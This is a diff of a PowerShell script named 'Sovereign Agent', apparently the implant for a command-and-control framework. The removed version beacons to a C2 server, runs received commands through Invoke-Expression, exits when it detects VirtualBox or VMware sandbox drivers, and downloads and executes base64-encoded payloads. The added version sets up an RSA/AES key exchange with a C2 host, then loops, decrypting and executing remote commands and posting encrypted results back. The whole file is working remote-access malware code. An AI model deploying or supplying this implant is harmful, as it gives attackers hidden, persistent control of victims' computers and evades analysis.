@@ -8,108 +8,174 @@
 # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 #########################################################################################################################################################################################################################
 
-# PowerShell script for Sovereign Agent
+$ErrorActionPreference = "Stop"
 
-$C2Server = "http://192.168.1.100"  # Replace with the IP address of your C2 server
-$AgentID = [guid]::NewGuid().ToString()
-
-Function Encrypt-Data {
-    param (
-        [string]$Data
+# Function to load or generate AgentID
+Function Load-AgentID {
+    Param (
+        [string]$FilePath
     )
-    $Key = (Get-Content "C:\\path\\to\\encryption_key.txt")
-    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Data)
-    $EncryptedBytes = [System.Security.Cryptography.ProtectedData]::Protect($Bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-    return [Convert]::ToBase64String($EncryptedBytes)
-}
-
-Function Decrypt-Data {
-    param (
-        [string]$Data
-    )
-    $Key = (Get-Content "C:\\path\\to\\encryption_key.txt")
-    $Bytes = [Convert]::FromBase64String($Data)
-    $DecryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($Bytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-    return [System.Text.Encoding]::UTF8.GetString($DecryptedBytes)
-}
-
-Function Write-Log {
-    param (
-        [string]$Message,
-        [string]$Color = "White"
-    )
-    Write-Host $Message -ForegroundColor $Color
-}
-
-Function Send-Data {
-    param (
-        [string]$Endpoint,
-        [hashtable]$Data
-    )
-    $DataJson = $Data | ConvertTo-Json
-    $EncryptedData = Encrypt-Data $DataJson
-    $Url = "$C2Server/$Endpoint"
-    $Response = Invoke-RestMethod -Uri $Url -Method Post -Body $EncryptedData -ContentType "application/json"
-    return Decrypt-Data $Response
-}
-
-Function Execute-Command {
-    param (
-        [string]$Command
-    )
-    Write-Log "Executing command: $Command"
-    try {
-        $Result = Invoke-Expression $Command
-        return $Result
-    } catch {
-        return $_.Exception.Message
+    If (Test-Path $FilePath) {
+        $AgentID = (Get-Content $FilePath -Raw).Trim()
+        Write-Host "[*] Loaded AgentID: $AgentID"
+        return $AgentID
+    } Else {
+        $AgentID = [guid]::NewGuid().ToString()
+        Set-Content -Path $FilePath -Value $AgentID
+        Write-Host "[*] Generated and saved new AgentID: $AgentID"
+        return $AgentID
     }
 }
 
-Function Check-Sandbox {
-    # Check for common sandbox artifacts
-    $sandbox_indicators = @("C:\\Windows\\System32\\drivers\\VBoxMouse.sys", "C:\\Windows\\System32\\drivers\\vmhgfs.sys")
-    foreach ($indicator in $sandbox_indicators) {
-        if (Test-Path $indicator) {
-            Write-Log "Sandbox detected: $indicator" "Red"
-            Exit
+# Function to send beacon to C2 server
+Function Send-Beacon {
+    Param (
+        [string]$AgentID,
+        [string]$C2Url,
+        [byte[]]$AESKey
+    )
+
+    Try {
+        $Body = @{
+            AgentID = $AgentID
+        } | ConvertTo-Json -Compress
+
+        Write-Host "[*] Sending beacon to C2 server..."
+        $Response = Invoke-RestMethod -Uri "$C2Url/beacon" -Method POST -Body $Body -ContentType "application/json"
+
+        $EncryptedCommand = $Response.data
+        $AES = New-Object System.Security.Cryptography.AesManaged
+        $AES.Key = $AESKey
+        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $CommandBytes = [Convert]::FromBase64String($EncryptedCommand)
+        $IV = $CommandBytes[0..15]
+        $CipherText = $CommandBytes[16..($CommandBytes.Length - 1)]
+        $Decryptor = $AES.CreateDecryptor($AES.Key, $IV)
+        $Command = [System.Text.Encoding]::UTF8.GetString($Decryptor.TransformFinalBlock($CipherText, 0, $CipherText.Length))
+
+        If ($Command -ne "NoCommand") {
+            Write-Host "[*] Received command: $Command"
+            # Execute the command and send the result back to the server
+            $Result = Invoke-Expression $Command | Out-String
+            $Result = $Result -replace "`r`n", "`n"  # Normalize newlines
+            Send-Result -AgentID $AgentID -C2Url $C2Url -Result $Result -AESKey $AESKey
+        } Else {
+            Write-Host "[*] No command received."
         }
+    } Catch {
+        Write-Host "[!] ERROR: $_"
+        $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
     }
 }
 
-Function PolymorphicSleep {
-    # Generate a polymorphic sleep interval
-    $interval = Get-Random -Minimum 10 -Maximum 60
-    Start-Sleep -Seconds $interval
-}
-
-Function Fetch-And-Execute-Payload {
-    param (
-        [string]$PayloadUrl
+# Function to send the result back to the C2 server
+Function Send-Result {
+    Param (
+        [string]$AgentID,
+        [string]$C2Url,
+        [string]$Result,
+        [byte[]]$AESKey
     )
-    try {
-        $Payload = Invoke-RestMethod -Uri $PayloadUrl -Method Get
-        $DecodedPayload = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($Payload))
-        Invoke-Expression $DecodedPayload
-    } catch {
-        Write-Log "Failed to fetch or execute payload: $_" "Red"
+
+    Try {
+        $AES = New-Object System.Security.Cryptography.AesManaged
+        $AES.Key = $AESKey
+        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $AES.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $Encryptor = $AES.CreateEncryptor()
+        $ResultBytes = [System.Text.Encoding]::UTF8.GetBytes($Result)
+        $CipherText = $Encryptor.TransformFinalBlock($ResultBytes, 0, $ResultBytes.Length)
+        $IV = $AES.IV
+        $EncryptedResult = [Convert]::ToBase64String($IV + $CipherText)
+
+        $Body = @{
+            AgentID = $AgentID
+            Result  = $EncryptedResult
+        } | ConvertTo-Json -Compress
+
+        Write-Host "[*] Sending result to C2 server..."
+        Invoke-RestMethod -Uri "$C2Url/result" -Method POST -Body $Body -ContentType "application/json"
+        Write-Host "[+] Result sent successfully."
+    } Catch {
+        Write-Host "[!] ERROR: $_"
+        $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
     }
 }
 
-Function Main {
-    Write-Log "Agent started. ID: $AgentID" "Cyan"
-    Check-Sandbox
-    while ($true) {
-        $Response = Send-Data "checkin" @{ "AgentID" = $AgentID }
-        if ($Response.Command) {
-            $Result = Execute-Command $Response.Command
-            Send-Data "result" @{ "AgentID" = $AgentID; "Result" = $Result }
+# Main script execution block
+Try {
+    $AgentIDFilePath = "C:\Temp\agent_id.txt"
+    $AgentID = Load-AgentID -FilePath $AgentIDFilePath
+    $C2Url = "http://10.0.2.4:8000"
+
+    Write-Host "[*] Fetching Public Key from C2 Server..."
+    $PublicKeyResponse = Invoke-RestMethod -Uri "$C2Url/public_key" -Method GET
+    
+    If (-Not $PublicKeyResponse.PublicKey) {
+        Throw "[-] Failed to retrieve public key"
+    }
+
+    # Use XML format instead of PEM
+    $PublicKeyXML = $PublicKeyResponse.PublicKey
+    Write-Host "[+] Public Key retrieved successfully."
+
+    # Convert XML Key to RSACryptoServiceProvider
+    Function Import-RSAKey ($PublicKeyXML) {
+        $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
+        $rsa.FromXmlString($PublicKeyXML)
+        return $rsa
+    }
+
+    $RSA = Import-RSAKey $PublicKeyXML
+
+    # Generate AES Key (256-bit)
+    $AESKey = New-Object byte[] 32
+    [Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($AESKey)
+    $AESKeyBase64 = [Convert]::ToBase64String($AESKey)
+    Write-Host "[*] Generated AES Key (Base64): $AESKeyBase64"
+
+    # Encrypt AES Key with RSA
+    Write-Host "[*] Encrypting AES Key with RSA..."
+    $EncryptedAESKey = $RSA.Encrypt($AESKey, $true)
+    $EncryptedAESKeyBase64 = [Convert]::ToBase64String($EncryptedAESKey)
+    Write-Host "[+] AES Key encrypted successfully."
+
+    # Send Encrypted AES Key to C2 Server
+    $Body = @{
+        AgentID   = $AgentID
+        EncAESKey = $EncryptedAESKeyBase64
+    } | ConvertTo-Json -Compress
+
+    Write-Host "[*] Sending encrypted AES key to C2 server..."
+    $Response = Invoke-RestMethod -Uri "$C2Url/exchange_key" -Method POST -Body $Body -ContentType "application/json"
+    
+    If ($Response.Status -ne "Success") {
+        Throw "[-] Key exchange failed: $($Response | ConvertTo-Json -Depth 10)"
+    }
+
+    Write-Host "[+] Key exchange successful."
+
+    # Register the agent with the C2 server
+    $CheckinBody = @{
+        AgentID = $AgentID
+    } | ConvertTo-Json -Compress
+    Invoke-RestMethod -Uri "$C2Url/checkin" -Method POST -Body $CheckinBody -ContentType "application/json"
+    Write-Host "[*] Agent check-in completed."
+
+    # Start sending beacons to keep the connection alive
+    While ($true) {
+        Try {
+            Send-Beacon -AgentID $AgentID -C2Url $C2Url -AESKey $AESKey
+        } Catch {
+            Write-Host "[!] ERROR during beacon: $_"
+            $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
         }
-        if ($Response.PayloadUrl) {
-            Fetch-And-Execute-Payload $Response.PayloadUrl
-        }
-        PolymorphicSleep
+        Start-Sleep -Seconds 10  # Adjust the interval as needed
     }
 }
-
-Main
+Catch {
+    Write-Host "[!] ERROR: $_"
+    $_ | Out-File -FilePath "C:\Temp\powershell_error.log" -Append
+    Start-Sleep -Seconds 10  # Keep window open for debugging
+}
